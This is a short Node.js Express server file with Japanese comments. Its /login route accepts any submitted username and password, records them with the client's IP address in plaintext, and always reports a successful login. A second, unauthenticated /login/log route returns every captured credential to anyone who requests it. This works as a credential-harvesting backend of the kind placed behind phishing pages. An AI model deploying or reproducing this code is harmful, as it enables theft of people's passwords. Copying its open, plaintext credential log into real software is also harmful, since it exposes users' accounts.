const express = require("express");
const path = require("path");

const app = express();
const loginLog = [];
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// HTML配信
app.use(express.static(__dirname));


// ログイエンドポイント
app.post("/login", (req, res) => {

  loginLog.push({user:req.body.user,password:req.body.password,ip:req.ip});
  res.json({ログイン成功:"そりゃそうだろ"});

});
app.get("/login/log",(q,r)=>{
  r.json(loginLog);
})

app.listen(process.env.PORT || 3000, () => {
  console.log("Server running");
});
